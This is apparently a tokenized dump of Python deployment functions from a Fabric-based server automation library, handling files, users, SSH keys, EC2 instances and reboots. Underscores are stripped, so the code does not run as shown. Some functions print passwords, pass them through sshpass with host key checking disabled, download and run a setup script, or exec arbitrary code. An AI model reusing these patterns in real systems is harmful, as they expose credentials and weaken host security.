def md5sum ( self , filename , use sudo = False ) : func = use sudo and run as root or self . run with self . settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn only = True ) : # Linux (LSB) if exists ( u'/usr/bin/md5sum' ) : res = func ( u'/usr/bin/md5sum %(filename)s' % locals ( ) ) # BSD / OS X elif exists ( u'/sbin/md5' ) : res = func ( u'/sbin/md5 -r %(filename)s' % locals ( ) ) # Smart OS Joyent build elif exists ( u'/opt/local/gnu/bin/md5sum' ) : res = func ( u'/opt/local/gnu/bin/md5sum %(filename)s' % locals ( ) ) # Smart OS Joyent build # (the former doesn't exist, at least on joyent 20130222T000747Z) elif exists ( u'/opt/local/bin/md5sum' ) : res = func ( u'/opt/local/bin/md5sum %(filename)s' % locals ( ) ) # Try to find ``md5sum`` or ``md5`` on ``$PATH`` or abort else : md5sum = func ( u'which md5sum' ) md5 = func ( u'which md5' ) if exists ( md5sum ) : res = func ( '%(md5sum)s %(filename)s' % locals ( ) ) elif exists ( md5 ) : res = func ( '%(md5)s %(filename)s' % locals ( ) ) else : abort ( 'No MD5 utility was found on this system.' ) if res . succeeded : md5sum = res else : warn ( res ) md5sum = None if isinstance ( md5sum , six . string types ) : md5sum = md5sum . strip ( ) . split ( '\n' ) [ - 1 ] . split ( ) [ 0 ] return md5sum
def uncommented lines ( self , filename , use sudo = False ) : func = run as root if use sudo else self . run res = func ( 'cat %s' % quote ( filename ) , quiet = True ) if res . succeeded : return [ line for line in res . splitlines ( ) if line and not line . startswith ( '#' ) ] return [ ]
def copy ( self , source , destination , recursive = False , use sudo = False ) : func = use sudo and run as root or self . run options = '-r ' if recursive else '' func ( '/bin/cp {0}{1} {2}' . format ( options , quote ( source ) , quote ( destination ) ) )
def move ( self , source , destination , use sudo = False ) : func = use sudo and run as root or self . run func ( '/bin/mv {0} {1}' . format ( quote ( source ) , quote ( destination ) ) )
def remove ( self , path , recursive = False , use sudo = False ) : func = use sudo and run as root or self . run options = '-r ' if recursive else '' func ( '/bin/rm {0}{1}' . format ( options , quote ( path ) ) )
def check for change ( self ) : r = self . local renderer lm = self . last manifest last fingerprint = lm . fingerprint current fingerprint = self . get target geckodriver version number ( ) self . vprint ( 'last fingerprint:' , last fingerprint ) self . vprint ( 'current fingerprint:' , current fingerprint ) if last fingerprint != current fingerprint : print ( 'A new release is available. %s' % self . get most recent version ( ) ) return True print ( 'No updates found.' ) return False
def is installed ( pkg name ) : manager = MANAGER with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn only = True ) : res = run ( "rpm --query %(pkg name)s" % locals ( ) ) if res . succeeded : return True return False
def static ( self ) : fn = self . render to file ( 'ip/ip interfaces static.template' ) r = self . local renderer r . put ( local path = fn , remote path = r . env . interfaces fn , use sudo = True )
def get thumbprint ( self ) : extensions = self . extensions . split ( ' ' ) name str = ' -or ' . join ( '-name "%s"' % ext for ext in extensions ) cmd = 'find ' + self . base dir + r' -type f \( ' + name str + r' \) -exec md5sum {} \; | sort -k 2 | md5sum' return getoutput ( cmd )
def get thumbprint ( self ) : d = { } if self . names : names = self . names else : names = list ( self . satchel . lenv ) for name in self . names : d [ name ] = deepcopy ( self . satchel . env [ name ] ) return d
def get thumbprint ( self ) : d = { } for tracker in self . trackers : d [ type ( tracker ) . name ] = tracker . get thumbprint ( ) return d
def upgrade ( safe = True ) : manager = MANAGER if safe : cmd = 'upgrade' else : cmd = 'dist-upgrade' run as root ( "%(manager)s --assume-yes %(cmd)s" % locals ( ) , pty = False )
def is installed ( pkg name ) : with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn only = True ) : res = run ( "dpkg -s %(pkg name)s" % locals ( ) ) for line in res . splitlines ( ) : if line . startswith ( "Status: " ) : status = line [ 8 : ] if "installed" in status . split ( ' ' ) : return True return False
def apt key exists ( keyid ) : # Command extracted from apt-key source gpg cmd = 'gpg --ignore-time-conflict --no-options --no-default-keyring --keyring /etc/apt/trusted.gpg' with settings ( hide ( 'everything' ) , warn only = True ) : res = run ( '%(gpg cmd)s --fingerprint %(keyid)s' % locals ( ) ) return res . succeeded
def exists ( self , name ) : with self . settings ( hide ( 'running' , 'stdout' , 'warnings' ) , warn only = True ) : return self . run ( 'getent group %(name)s' % locals ( ) ) . succeeded
def enter password change ( self , username = None , old password = None ) : from fabric . state import connections from fabric . network import disconnect all r = self . local renderer #         print('self.genv.user:', self.genv.user) #         print('self.env.passwords:', self.env.passwords) r . genv . user = r . genv . user or username r . pc ( 'Changing password for user {user} via interactive prompts.' ) r . env . old password = r . env . default passwords [ self . genv . user ] #         print('self.genv.user:', self.genv.user) #         print('self.env.passwords:', self.env.passwords) r . env . new password = self . env . passwords [ self . genv . user ] if old password : r . env . old password = old password prompts = { '(current) UNIX password: ' : r . env . old password , 'Enter new UNIX password: ' : r . env . new password , 'Retype new UNIX password: ' : r . env . new password , #"Login password for '%s': " % r.genv.user: r.env.new password, #             "Login password for '%s': " % r.genv.user: r.env.old password, } print ( 'prompts:' , prompts ) r . env . password = r . env . old password with self . settings ( warn only = True ) : ret = r . local ( "sshpass -p '{password}' ssh -o Strict Host Key Checking=no {user}@{host string} echo hello" , capture = True ) #code 1 = good password, but prompts needed #code 5 = bad password #code 6 = good password, but host public key is unknown if ret . return code in ( 1 , 6 ) or 'hello' in ret : # Login succeeded, so we haven't yet changed the password, so use the default password. self . genv . password = r . env . old password elif self . genv . user in self . genv . user passwords : # Otherwise, use the password or key set in the config. self . genv . password = r . env . new password else : # Default password fails and there's no current password, so clear. self . genv . password = None print ( 'using password:' , self . genv . password ) # Note, the correct current password should be set in host.initrole(), not here. #r.genv.password = r.env.new password #r.genv.password = r.env.new password with self . settings ( prompts = prompts ) : ret = r . run ( 'echo checking for expired password' ) print ( 'ret:[%s]' % ret ) do disconnect = 'passwd: password updated successfully' in ret print ( 'do disconnect:' , do disconnect ) if do disconnect : # We need to disconnect to reset the session or else Linux will again prompt # us to change our password. disconnect all ( ) # Further logins should require the new password. self . genv . password = r . env . new password
def togroups ( self , user , groups ) : r = self . local renderer if isinstance ( groups , six . string types ) : groups = [ . strip ( ) for in groups . split ( ',' ) if . strip ( ) ] for group in groups : r . env . username = user r . env . group = group r . sudo ( 'groupadd --force {group}' ) r . sudo ( 'adduser {username} {group}' )
def generate keys ( self , username , hostname ) : r = self . local renderer #r.env.key filename = r.env.key filename or env.key filename #assert r.env.key filename, 'r.env.key filename or env.key filename must be set. e.g. roles/role/app name-role.pem' r . env . key filename = self . env . key filename template . format ( ROLE = self . genv . ROLE , host = hostname , username = username , ) if os . path . isfile ( r . env . key filename ) : r . pc ( 'Key file {key filename} already exists. Skipping generation.' . format ( * * r . env ) ) else : r . local ( "ssh-keygen -t {key type} -b {key bits} -f {key filename} -N ''" ) r . local ( 'chmod {key perms} {key filename}' ) if r . env . key filename . endswith ( '.pem' ) : src = r . env . key filename + '.pub' dst = ( r . env . key filename + '.pub' ) . replace ( '.pem' , '' ) #                 print('generate keys:', src, dst) r . env . src = src r . env . dst = dst r . local ( 'mv {src} {dst}' ) return r . env . key filename
def create ( self , username , groups = None , uid = None , create home = None , system = False , password = None , home dir = None ) : r = self . local renderer r . env . username = username args = [ ] if uid : args . append ( '-u %s' % uid ) if create home is None : create home = not system if create home is True : if home dir : args . append ( '--home %s' % home dir ) elif create home is False : args . append ( '--no-create-home' ) if password is None : pass elif password : crypted password = crypt password ( password ) args . append ( '-p %s' % quote ( crypted password ) ) else : args . append ( '--disabled-password' ) args . append ( '--gecos ""' ) if system : args . append ( '--system' ) r . env . args = ' ' . join ( args ) r . env . groups = ( groups or '' ) . strip ( ) r . sudo ( 'adduser {args} {username} || true' ) if groups : for group in groups . split ( ' ' ) : group = group . strip ( ) if not group : continue r . sudo ( 'adduser %s %s || true' % ( username , group ) )
def expire password ( self , username ) : r = self . local renderer r . env . username = username r . sudo ( 'chage -d 0 {username}' )
def shell ( self , gui = 0 , command = '' , dryrun = None , shell interactive cmd str = None ) : from burlap . common import get hosts for site if dryrun is not None : self . dryrun = dryrun r = self . local renderer if r . genv . SITE != r . genv . default site : shell hosts = get hosts for site ( ) if shell hosts : r . genv . host string = shell hosts [ 0 ] r . env . SITE = r . genv . SITE or r . genv . default site if int ( gui ) : r . env . shell default options . append ( '-X' ) if 'host string' not in self . genv or not self . genv . host string : if 'available sites' in self . genv and r . env . SITE not in r . genv . available sites : raise Exception ( 'No host string set. Unknown site %s.' % r . env . SITE ) else : raise Exception ( 'No host string set.' ) if '@' in r . genv . host string : r . env . shell host string = r . genv . host string else : r . env . shell host string = '{user}@{host string}' if command : r . env . shell interactive cmd str = command else : r . env . shell interactive cmd str = r . format ( shell interactive cmd str or r . env . shell interactive cmd ) r . env . shell default options str = ' ' . join ( r . env . shell default options ) if self . is local : self . vprint ( 'Using direct local.' ) cmd = '{shell interactive cmd str}' elif r . genv . key filename : self . vprint ( 'Using key filename.' ) # If host string contains the port, then strip it off and pass separately. port = r . env . shell host string . split ( ':' ) [ - 1 ] if port . isdigit ( ) : r . env . shell host string = r . env . shell host string . split ( ':' ) [ 0 ] + ( ' -p %s' % port ) cmd = 'ssh -t {shell default options str} -i {key filename} {shell host string} "{shell interactive cmd str}"' elif r . genv . password : self . vprint ( 'Using password.' ) cmd = 'ssh -t {shell default options str} {shell host string} "{shell interactive cmd str}"' else : # No explicit password or key file needed? self . vprint ( 'Using nothing.' ) cmd = 'ssh -t {shell default options str} {shell host string} "{shell interactive cmd str}"' r . local ( cmd )
def disk ( self ) : r = self . local renderer r . run ( r . env . disk usage command )
def tunnel ( self , local port , remote port ) : r = self . local renderer r . env . tunnel local port = local port r . env . tunnel remote port = remote port r . local ( ' ssh -i {key filename} -L {tunnel local port}:localhost:{tunnel remote port} {user}@{host string} -N' )
def install from scratch ( python cmd , use sudo ) : with cd ( "/tmp" ) : download ( EZ SETUP URL ) command = '%(python cmd)s ez setup.py' % locals ( ) if use sudo : run as root ( command ) else : run ( command ) run ( 'rm -f ez setup.py' )
def has virtualenv ( self ) : with self . settings ( warn only = True ) : ret = self . run or local ( 'which virtualenv' ) . strip ( ) return bool ( ret )
def virtualenv exists ( self , virtualenv dir = None ) : r = self . local renderer ret = True with self . settings ( warn only = True ) : ret = r . run or local ( 'ls {virtualenv dir}' ) or '' ret = 'cannot access' not in ret . strip ( ) . lower ( ) if self . verbose : if ret : print ( 'Yes' ) else : print ( 'No' ) return ret
def what requires ( self , name ) : r = self . local renderer r . env . name = name r . local ( 'pipdeptree -p {name} --reverse' )
def init ( self ) : r = self . local renderer #         if self.virtualenv exists(): #             print('virtualenv exists') #             return print ( 'Creating new virtual environment...' ) with self . settings ( warn only = True ) : cmd = '[ ! -d {virtualenv dir} ] && virtualenv --no-site-packages {virtualenv dir} || true' if self . is local : r . run or local ( cmd ) else : r . sudo ( cmd )
def get combined requirements ( self , requirements = None ) : requirements = requirements or self . env . requirements def iter lines ( fn ) : with open ( fn , 'r' ) as fin : for line in fin . readlines ( ) : line = line . strip ( ) if not line or line . startswith ( '#' ) : continue yield line content = [ ] if isinstance ( requirements , ( tuple , list ) ) : for f in requirements : f = self . find template ( f ) content . extend ( list ( iter lines ( f ) ) ) else : assert isinstance ( requirements , six . string types ) f = self . find template ( requirements ) content . extend ( list ( iter lines ( f ) ) ) return '\n' . join ( content )
def list instances ( show = 1 , name = None , group = None , release = None , except release = None ) : from burlap . common import shelf , Ordered Dict , get verbose verbose = get verbose ( ) require ( 'vm type' , 'vm group' ) assert env . vm type , 'No VM type specified.' env . vm type = ( env . vm type or '' ) . lower ( ) name = name group = group release = release if verbose : print ( 'name=%s, group=%s, release=%s' % ( name , group , release ) ) env . vm elastic ip mappings = shelf . get ( 'vm elastic ip mappings' ) data = type ( env ) ( ) if env . vm type == EC2 : if verbose : print ( 'Checking EC2...' ) for instance in get all running ec2 instances ( ) : name = instance . tags . get ( env . vm name tag ) group = instance . tags . get ( env . vm group tag ) release = instance . tags . get ( env . vm release tag ) if env . vm group and env . vm group != group : if verbose : print ( ( 'Skipping instance %s because its group "%s" ' 'does not match env.vm group "%s".' ) % ( instance . public dns name , group , env . vm group ) ) continue if group and group != group : if verbose : print ( ( 'Skipping instance %s because its group "%s" ' 'does not match local group "%s".' ) % ( instance . public dns name , group , group ) ) continue if name and name != name : if verbose : print ( ( 'Skipping instance %s because its name "%s" ' 'does not match name "%s".' ) % ( instance . public dns name , name , name ) ) continue if release and release != release : if verbose : print ( ( 'Skipping instance %s because its release "%s" ' 'does not match release "%s".' ) % ( instance . public dns name , release , release ) ) continue if except release and release == except release : continue if verbose : print ( 'Adding instance %s (%s).' % ( name , instance . public dns name ) ) data . setdefault ( name , type ( env ) ( ) ) data [ name ] [ 'id' ] = instance . id data [ name ] [ 'public dns name' ] = instance . public dns name if verbose : print ( 'Public DNS: %s' % instance . public dns name ) if env . vm elastic ip mappings and name in env . vm elastic ip mappings : data [ name ] [ 'ip' ] = env . vm elastic ip mappings [ name ] else : data [ name ] [ 'ip' ] = socket . gethostbyname ( instance . public dns name ) if int ( show ) : pprint ( data , indent = 4 ) return data elif env . vm type == KVM : #virsh list pass else : raise Not Implemented Error
def get or create ec2 security groups ( names = None , verbose = 1 ) : verbose = int ( verbose ) if verbose : print ( 'Creating EC2 security groups...' ) conn = get ec2 connection ( ) if isinstance ( names , six . string types ) : names = names . split ( ',' ) names = names or env . vm ec2 selected security groups if verbose : print ( 'Group names:' , names ) ret = [ ] for name in names : try : group id = get ec2 security group id ( name ) if verbose : print ( 'group id:' , group id ) #group = conn.get all security groups(groupnames=[name])[0] # Note, groups in a VPC can't be referred to by name? group = conn . get all security groups ( group ids = [ group id ] ) [ 0 ] except boto . exception . EC2Response Error as e : if verbose : print ( e ) group = get ec2 connection ( ) . create security group ( name , name , vpc id = env . vm ec2 vpc id , ) print ( 'group id:' , group . id ) set ec2 security group id ( name , group . id ) ret . append ( group ) # Find existing rules. actual sets = set ( ) for rule in list ( group . rules ) : ip protocol = rule . ip protocol from port = rule . from port to port = rule . to port for cidr ip in rule . grants : #print('Revoking:', ip protocol, from port, to port, cidr ip) #group.revoke(ip protocol, from port, to port, cidr ip) rule groups = ( ( rule . groups and rule . groups . split ( ',' ) ) or [ None ] ) for src group in rule groups : src group = ( src group or '' ) . strip ( ) if src group : actual sets . add ( ( ip protocol , from port , to port , str ( cidr ip ) , src group ) ) else : actual sets . add ( ( ip protocol , from port , to port , str ( cidr ip ) ) ) # Find actual rules. expected sets = set ( ) for authorization in env . vm ec2 available security groups . get ( name , [ ] ) : if verbose : print ( 'authorization:' , authorization ) if len ( authorization ) == 4 or ( len ( authorization ) == 5 and not ( authorization [ - 1 ] or '' ) . strip ( ) ) : src group = None ip protocol , from port , to port , cidr ip = authorization [ : 4 ] if cidr ip : expected sets . add ( ( ip protocol , str ( from port ) , str ( to port ) , cidr ip ) ) else : ip protocol , from port , to port , cidr ip , src group = authorization if cidr ip : expected sets . add ( ( ip protocol , str ( from port ) , str ( to port ) , cidr ip , src group ) ) # Calculate differences and update rules if we own the group. if env . vm ec2 security group owner : if verbose : print ( 'expected sets:' ) print ( expected sets ) print ( 'actual sets:' ) print ( actual sets ) del sets = actual sets . difference ( expected sets ) if verbose : print ( 'del sets:' ) print ( del sets ) add sets = expected sets . difference ( actual sets ) if verbose : print ( 'add sets:' ) print ( add sets ) # Revoke deleted. for auth in del sets : print ( len ( auth ) ) print ( 'revoking:' , auth ) group . revoke ( * auth ) # Create fresh rules. for auth in add sets : print ( 'authorizing:' , auth ) group . authorize ( * auth ) return ret
def get or create ec2 key pair ( name = None , verbose = 1 ) : verbose = int ( verbose ) name = name or env . vm ec2 keypair name pem path = 'roles/%s/%s.pem' % ( env . ROLE , name ) conn = get ec2 connection ( ) kp = conn . get key pair ( name ) if kp : print ( 'Key pair %s already exists.' % name ) else : # Note, we only get the private key during creation. # If we don't save it here, it's lost forever. kp = conn . create key pair ( name ) open ( pem path , 'wb' ) . write ( kp . material ) os . system ( 'chmod 600 %s' % pem path ) print ( 'Key pair %s created.' % name ) #return kp return pem path
def exists ( name = None , group = None , release = None , except release = None , verbose = 1 ) : verbose = int ( verbose ) instances = list instances ( name = name , group = group , release = release , except release = except release , verbose = verbose , show = verbose ) ret = bool ( instances ) if verbose : print ( '\ninstance %s exist' % ( 'DOES' if ret else 'does NOT' ) ) #return ret return instances
def get or create ( name = None , group = None , config = None , extra = 0 , verbose = 0 , backend opts = None ) : require ( 'vm type' , 'vm group' ) backend opts = backend opts or { } verbose = int ( verbose ) extra = int ( extra ) if config : config fn = common . find template ( config ) config = yaml . load ( open ( config fn ) ) env . update ( config ) env . vm type = ( env . vm type or '' ) . lower ( ) assert env . vm type , 'No VM type specified.' group = group or env . vm group assert group , 'No VM group specified.' ret = exists ( name = name , group = group ) if not extra and ret : if verbose : print ( 'VM %s:%s exists.' % ( name , group ) ) return ret today = datetime . date . today ( ) release = int ( '%i%02i%02i' % ( today . year , today . month , today . day ) ) if not name : existing instances = list instances ( group = group , release = release , verbose = verbose ) name = env . vm name template . format ( index = len ( existing instances ) + 1 ) if env . vm type == EC2 : return get or create ec2 instance ( name = name , group = group , release = release , verbose = verbose , backend opts = backend opts ) else : raise Not Implemented Error
def delete ( name = None , group = None , release = None , except release = None , dryrun = 1 , verbose = 1 ) : verbose = int ( verbose ) if env . vm type == EC2 : conn = get ec2 connection ( ) instances = list instances ( name = name , group = group , release = release , except release = except release , ) for instance name , instance data in instances . items ( ) : public dns name = instance data [ 'public dns name' ] print ( '\n Deleting %s (%s)...' % ( instance name , instance data [ 'id' ] ) ) if not get dryrun ( ) : conn . terminate instances ( instance ids = [ instance data [ 'id' ] ] ) # Clear host key on localhost. known hosts = os . path . expanduser ( '~/.ssh/known hosts' ) cmd = 'ssh-keygen -f "%s" -R %s' % ( known hosts , public dns name ) local or dryrun ( cmd ) else : raise Not Implemented Error
def get name ( ) : if env . vm type == EC2 : for instance in get all running ec2 instances ( ) : if env . host string == instance . public dns name : name = instance . tags . get ( env . vm name tag ) return name else : raise Not Implemented Error
def respawn ( name = None , group = None ) : if name is None : name = get name ( ) delete ( name = name , group = group ) instance = get or create ( name = name , group = group ) env . host string = instance . public dns name
def deploy code ( self ) : assert self . genv . SITE , 'Site unspecified.' assert self . genv . ROLE , 'Role unspecified.' r = self . local renderer if self . env . exclusions : r . env . exclusions str = ' ' . join ( "--exclude='%s'" % for in self . env . exclusions ) r . local ( r . env . rsync command ) r . sudo ( 'chown -R {rsync chown user}:{rsync chown group} {rsync dst dir}' )
def init env ( ) : env . ROLES DIR = ROLE DIR env . services = [ ] env . confirm deployment = False env . is local = None env . base config dir = '.' env . src dir = 'src' # The path relative to fab where the code resides. env . sites = { } # {site:site settings} env [ SITE ] = None env [ ROLE ] = None env . hosts retriever = None env . hosts retrievers = type ( env ) ( ) #'default':lambda hostname: hostname, env . hostname translator = 'default' env . hostname translators = type ( env ) ( ) env . hostname translators . default = lambda hostname : hostname env . default site = None # A list of all site names that should be available on the current host. env . available sites = [ ] # A list of all site names per host. # {hostname: [sites]} # If no entry found, will use available sites. env . available sites by host = { } # The command run to determine the percent of disk usage. env . disk usage command = "df -H | grep -v E '^Filesystem|tmpfs|cdrom|none' | awk '{print $5 " " $1}'" env . burlap data dir = '.burlap' env . setdefault ( 'roledefs' , { } ) env . setdefault ( 'roles' , [ ] ) env . setdefault ( 'hosts' , [ ] ) env . setdefault ( 'exclude hosts' , [ ] )
def create module ( name , code = None ) : if name not in sys . modules : sys . modules [ name ] = imp . new module ( name ) module = sys . modules [ name ] if code : print ( 'executing code for %s: %s' % ( name , code ) ) exec ( code in module . dict ) # pylint: disable=exec-used exec ( "from %s import %s" % ( name , '*' ) ) # pylint: disable=exec-used return module
def str to list ( s ) : if s is None : return [ ] elif isinstance ( s , ( tuple , list ) ) : return s elif not isinstance ( s , six . string types ) : raise Not Implemented Error ( 'Unknown type: %s' % type ( s ) ) return [ . strip ( ) . lower ( ) for in ( s or '' ) . split ( ',' ) if . strip ( ) ]
def get hosts retriever ( s = None ) : s = s or env . hosts retriever #     #assert s, 'No hosts retriever specified.' if not s : return env hosts retriever #     module name = '.'.join(s.split('.')[:-1]) #     func name = s.split('.')[-1] #     retriever = getattr(importlib.import module(module name), func name) #     return retriever return str to callable ( s ) or env hosts retriever
def write temp file or dryrun ( content , * args , * * kwargs ) : dryrun = get dryrun ( kwargs . get ( 'dryrun' ) ) if dryrun : fd , tmp fn = tempfile . mkstemp ( ) os . remove ( tmp fn ) cmd run = 'local' cmd = 'cat <<EOT >> %s\n%s\n EOT' % ( tmp fn , content ) if BURLAP COMMAND PREFIX : print ( '%s %s: %s' % ( render command prefix ( ) , cmd run , cmd ) ) else : print ( cmd ) else : fd , tmp fn = tempfile . mkstemp ( ) fout = open ( tmp fn , 'w' ) fout . write ( content ) fout . close ( ) return tmp fn
def reboot or dryrun ( * args , * * kwargs ) : from fabric . state import connections verbose = get verbose ( ) dryrun = get dryrun ( kwargs . get ( 'dryrun' ) ) # Use 'wait' as max total wait time kwargs . setdefault ( 'wait' , 120 ) wait = int ( kwargs [ 'wait' ] ) command = kwargs . get ( 'command' , 'reboot' ) now = int ( kwargs . get ( 'now' , 0 ) ) print ( 'now:' , now ) if now : command += ' now' # Shorter timeout for a more granular cycle than the default. timeout = int ( kwargs . get ( 'timeout' , 30 ) ) reconnect hostname = kwargs . pop ( 'new hostname' , env . host string ) if 'dryrun' in kwargs : del kwargs [ 'dryrun' ] if dryrun : print ( '%s sudo: %s' % ( render command prefix ( ) , command ) ) else : if is local ( ) : if raw input ( 'reboot localhost now? ' ) . strip ( ) [ 0 ] . lower ( ) != 'y' : return attempts = int ( round ( float ( wait ) / float ( timeout ) ) ) # Don't bleed settings, since this is supposed to be self-contained. # User adaptations will probably want to drop the "with settings()" and # just have globally set timeout/attempts values. with settings ( warn only = True ) : sudo ( command ) env . host string = reconnect hostname success = False for attempt in xrange ( attempts ) : # Try to make sure we don't slip in before pre-reboot lockdown if verbose : print ( 'Waiting for %s seconds, wait %i of %i' % ( timeout , attempt + 1 , attempts ) ) time . sleep ( timeout ) # This is actually an internal-ish API call, but users can simply drop # it in real fabfile use -- the next run/sudo/put/get/etc call will # automatically trigger a reconnect. # We use it here to force the reconnect while this function is still in # control and has the above timeout settings enabled. try : if verbose : print ( 'Reconnecting to:' , env . host string ) # This will fail until the network interface comes back up. connections . connect ( env . host string ) # This will also fail until SSH is running again. with settings ( timeout = timeout ) : run ( 'echo hello' ) success = True break except Exception as e : print ( 'Exception:' , e ) if not success : raise Exception ( 'Reboot failed or took longer than %s seconds.' % wait )
def get last modified timestamp ( path , ignore = None ) : ignore = ignore or [ ] if not isinstance ( path , six . string types ) : return ignore str = '' if ignore : assert isinstance ( ignore , ( tuple , list ) ) ignore str = ' ' . join ( "! -name '%s'" % for in ignore ) cmd = 'find "' + path + '" ' + ignore str + ' -type f -printf "%T@ %p\n" | sort -n | tail -1 | cut -f 1 -d " "' #'find '+path+' -type f -printf "%T@ %p\n" | sort -n | tail -1 | cut -d " " -f1 ret = subprocess . check output ( cmd , shell = True ) # Note, we round now to avoid rounding errors later on where some formatters # use different decimal contexts. try : ret = round ( float ( ret ) , 2 ) except Value Error : return return ret
def get packager ( ) : # TODO: remove once fabric stops using contextlib.nested. import warnings warnings . filterwarnings ( "ignore" , category = Deprecation Warning ) common packager = get rc ( 'common packager' ) if common packager : return common packager #TODO:cache result by current env.host string so we can handle multiple hosts with different O Ses with settings ( warn only = True ) : with hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) : ret = run ( 'cat /etc/fedora-release' ) if ret . succeeded : common packager = YUM else : ret = run ( 'cat /etc/lsb-release' ) if ret . succeeded : common packager = APT else : for pn in PACKAGERS : ret = run ( 'which %s' % pn ) if ret . succeeded : common packager = pn break if not common packager : raise Exception ( 'Unable to determine packager.' ) set rc ( 'common packager' , common packager ) return common packager
def get os version ( ) : # TODO: remove once fabric stops using contextlib.nested. import warnings warnings . filterwarnings ( "ignore" , category = Deprecation Warning ) common os version = get rc ( 'common os version' ) if common os version : return common os version with settings ( warn only = True ) : with hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) : ret = run or local ( 'cat /etc/lsb-release' ) if ret . succeeded : return OS ( type = LINUX , distro = UBUNTU , release = re . findall ( r'DISTRIB RELEASE=([0-9\.]+)' , ret ) [ 0 ] ) ret = run or local ( 'cat /etc/debian version' ) if ret . succeeded : return OS ( type = LINUX , distro = DEBIAN , release = re . findall ( r'([0-9\.]+)' , ret ) [ 0 ] ) ret = run or local ( 'cat /etc/fedora-release' ) if ret . succeeded : return OS ( type = LINUX , distro = FEDORA , release = re . findall ( r'release ([0-9]+)' , ret ) [ 0 ] ) raise Exception ( 'Unable to determine OS version.' )
def render to string ( template , extra = None ) : from jinja2 import Template extra = extra or { } final fqfn = find template ( template ) assert final fqfn , 'Template not found: %s' % template template content = open ( final fqfn , 'r' ) . read ( ) t = Template ( template content ) if extra : context = env . copy ( ) context . update ( extra ) else : context = env rendered content = t . render ( * * context ) rendered content = rendered content . replace ( '&quot;' , '"' ) return rendered content
def iter sites ( sites = None , site = None , renderer = None , setter = None , no secure = False , verbose = None ) : if verbose is None : verbose = get verbose ( ) hostname = get current hostname ( ) target sites = env . available sites by host . get ( hostname , None ) if sites is None : site = site or env . SITE or ALL if site == ALL : sites = list ( six . iteritems ( env . sites ) ) else : sys . stderr . flush ( ) sites = [ ( site , env . sites . get ( site ) ) ] renderer = renderer #or render remote paths env default = save env ( ) for site , site data in sorted ( sites ) : if no secure and site . endswith ( ' secure' ) : continue # Only load site configurations that are allowed for this host. if target sites is None : pass else : assert isinstance ( target sites , ( tuple , list ) ) if site not in target sites : if verbose : print ( 'Skipping site %s because not in among target sites.' % site ) continue env . update ( env default ) env . update ( env . sites . get ( site , { } ) ) env . SITE = site if callable ( renderer ) : renderer ( ) if setter : setter ( site ) yield site , site data # Revert modified keys. env . update ( env default ) # Remove keys that were added, not simply updated. added keys = set ( env ) . difference ( env default ) for key in added keys : # Don't remove internally maintained variables, because these are used to cache hostnames # used by iter sites(). if key . startswith ( ' ' ) : continue del env [ key ]
def get hosts for site ( site = None ) : site = site or env . SITE hosts = set ( ) for hostname , sites in six . iteritems ( env . available sites by host ) : #         print('checking hostname:',hostname,  sites) for site in sites : if site == site : #                 print( ' site:', site) host ip = get host ip ( hostname ) #                 print( 'host ip:',host ip) if host ip : hosts . add ( host ip ) break return list ( hosts )
def collect genv ( self , include local = True , include global = True ) : e = type ( self . genv ) ( ) if include global : e . update ( self . genv ) if include local : for k , v in self . lenv . items ( ) : e [ '%s %s' % ( self . obj . name . lower ( ) , k ) ] = v return e
def capture bash ( self ) : class Capture ( object ) : def init ( self , satchel ) : self . satchel = satchel self . dryrun = self . satchel . dryrun self . satchel . dryrun = 1 begincap ( ) self . stdout = sys . stdout self . stderr = sys . stderr self . stdout = sys . stdout = String IO ( ) self . stderr = sys . stderr = String IO ( ) def enter ( self ) : return self def exit ( self , type , value , traceback ) : # pylint: disable=redefined-builtin endcap ( ) self . satchel . dryrun = self . dryrun sys . stdout = self . stdout sys . stderr = self . stderr return Capture ( self )
def register ( self ) : self . set defaults ( ) all satchels [ self . name . upper ( ) ] = self manifest recorder [ self . name ] = self . record manifest # Register service commands. if self . required system packages : required system packages [ self . name . upper ( ) ] = self . required system packages
def unregister ( self ) : for k in list ( env . keys ( ) ) : if k . startswith ( self . env prefix ) : del env [ k ] try : del all satchels [ self . name . upper ( ) ] except Key Error : pass try : del manifest recorder [ self . name ] except Key Error : pass try : del manifest deployers [ self . name . upper ( ) ] except Key Error : pass try : del manifest deployers befores [ self . name . upper ( ) ] except Key Error : pass try : del required system packages [ self . name . upper ( ) ] except Key Error : pass
def get tasks ( self ) : tasks = set ( self . tasks ) #DEPRECATED for name in dir ( self ) : # Skip properties so we don't accidentally execute any methods. if isinstance ( getattr ( type ( self ) , name , None ) , property ) : continue attr = getattr ( self , name ) if hasattr ( attr , ' call ' ) and getattr ( attr , 'is task' , False ) : tasks . add ( name ) return sorted ( tasks )
def local renderer ( self ) : if not self . local renderer : r = self . create local renderer ( ) self . local renderer = r return self . local renderer
def all other enabled satchels ( self ) : return dict ( ( name , satchel ) for name , satchel in self . all satchels . items ( ) if name != self . name . upper ( ) and name . lower ( ) in map ( str . lower , self . genv . services ) )
def lenv ( self ) : env = type ( env ) ( ) for k , v in six . iteritems ( env ) : if k . startswith ( self . name + ' ' ) : env [ k [ len ( self . name ) + 1 : ] ] = v return env
def param changed to ( self , key , to value , from value = None ) : last value = getattr ( self . last manifest , key ) current value = self . current manifest . get ( key ) if from value is not None : return last value == from value and current value == to value return last value != to value and current value == to value
def reboot or dryrun ( self , * args , * * kwargs ) : warnings . warn ( 'Use self.run() instead.' , Deprecation Warning , stacklevel = 2 ) self . reboot ( * args , * * kwargs )
def set site specifics ( self , site ) : r = self . local renderer site data = self . genv . sites [ site ] . copy ( ) r . env . site = site if self . verbose : print ( 'set site specifics.data:' ) pprint ( site data , indent = 4 ) # Remove local namespace settings from the global namespace # by converting <satchel name> <variable name> to <variable name>. local ns = { } for k , v in list ( site data . items ( ) ) : if k . startswith ( self . name + ' ' ) : k = k [ len ( self . name + ' ' ) : ] local ns [ k ] = v del site data [ k ] r . env . update ( local ns ) r . env . update ( site data )
